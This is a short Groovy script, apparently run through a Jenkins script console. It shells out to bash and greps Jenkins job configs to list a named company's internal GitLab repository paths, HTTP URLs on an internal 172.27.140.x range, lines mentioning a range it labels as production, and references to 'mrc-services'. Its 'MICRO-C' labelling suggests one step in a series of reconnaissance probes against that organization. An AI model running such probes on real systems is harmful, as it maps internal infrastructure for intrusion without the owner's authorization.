// MICRO-C: List all unique GitLab repo paths from Jenkins job configs
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    p.waitForOrKill(20000)
    [out: p.inputStream.text.take(5000), err: p.errorStream.text.take(200)]
}

println "=== ALL GITLAB REPO URLS (from job configs) ==="
def r1 = run('grep -roh "https://gitlab\\.dev\\.claroshop\\.com/[a-zA-Z0-9._/-]*" /var/jenkins_home/jobs/ 2>/dev/null | sort -u')
println r1.out ?: "(none)"

println "\n=== GITLAB HTTP URLs ==="
def r2 = run('grep -roh "http://172\\.27\\.140\\.[0-9]*/[a-zA-Z0-9._/-]*" /var/jenkins_home/jobs/ 2>/dev/null | sort -u')
println r2.out ?: "(none)"

println "\n=== ALL STRINGS with 172.27.141 (PROD) ==="
def r3 = run('grep -rh "172\\.27\\.141" /var/jenkins_home/jobs/ 2>/dev/null | grep -v "^Binary" | head -30')
println r3.out ?: "(none)"

println "\n=== mrc-services mentions ==="
def r4 = run('grep -rh "mrc-services" /var/jenkins_home/jobs/ 2>/dev/null | grep -v "^Binary" | head -20')
println r4.out ?: "(none)"

println "\n=== DONE MICRO-C ==="
